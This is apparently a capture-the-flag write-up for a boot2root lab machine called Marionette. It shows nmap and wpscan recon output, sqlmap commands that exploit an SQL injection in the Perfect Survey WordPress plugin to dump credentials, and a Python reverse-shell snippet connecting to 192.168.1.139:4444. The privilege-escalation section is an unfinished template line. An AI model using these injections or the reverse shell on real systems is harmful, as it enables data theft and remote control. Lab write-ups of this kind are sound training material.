# Introduction
Marionette is an easy boot2root CTF machine that mixes fantasy story telling, web application exploitation and a creative privilege scalation vector to hone your skills

Identification of IP Address

Use netdiscover to identify the target machine's IP address on your network:
```bash
netdiscover -r 10.10.10.0/24
```

Replace `10.10.10.0/24` with your network range (e.g., 192.168.0.1/24). This will scan the local network and display all active hosts with their IP addresses and MAC addresses.


# Enumeration

Start by running an nmap scan to identify open ports:
```bash
nmap -T4 -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.63 ((Ubuntu))
MAC Address: 08:00:27:C0:EB:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Results show ports 22 (SSH) and 80 (HTTP) are open.

Visit the HTTP page in a browser. The site is running WordPress.

Use wpscan to enumerate WordPress vulnerabilities:
```bash
wpscan --url http://<target> --enumerate vp

[+] perfect-survey
 | Location: http://10.10.10.15/wp-content/plugins/perfect-survey/
 | Latest Version: 1.5.1 (up to date)
 | Last Updated: 2021-06-11T12:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.15/wp-content/plugins/perfect-survey/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.15/wp-content/plugins/perfect-survey/readme.txt
```

We have identified that the target is running Perfect Survey 1.5.1 which is vulnerable to Unauthenticated SQLi ([CVE-2021-24762](https://www.exploit-db.com/exploits/50766))

# Foothold

Examine the exploit for the vulnerable plugin from ExploitDB, this endpoint is vulnerable to SQLi:
```bash
wp-admin/admin-ajax.php?action=get_question&question_id=1
```

While we can use the exploti PoC; we can directly use sqlmap instead

Use the exploit to dump the WordPress database:
```bash
sqlmap 'http://marionette.ip/wp-admin/admin-ajax.php?action=get_question&question_id=1' --dbs
```

> It's now the time to enumerate further, since this is a writeup I'll jump straight to the solution
```bash
sqlmap 'http://marionette.ip/wp-admin/admin-ajax.php?action=get_question&question_id=1' -D workshop -T user_backups --dump
```
> crack the hashes using john/hashcat or [Crackstation](crackstation.net)

Obtain credentials for the user `pinocchio` and use them to gain a shell on the target system.


# Privilege Escalation

Describe the steps to obtaining root/administrator privileges on the box.

```python
import socket,os,pty

def check_inventory():
    s=socket.socket()
    s.connect(("192.168.1.139", 4444))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")
```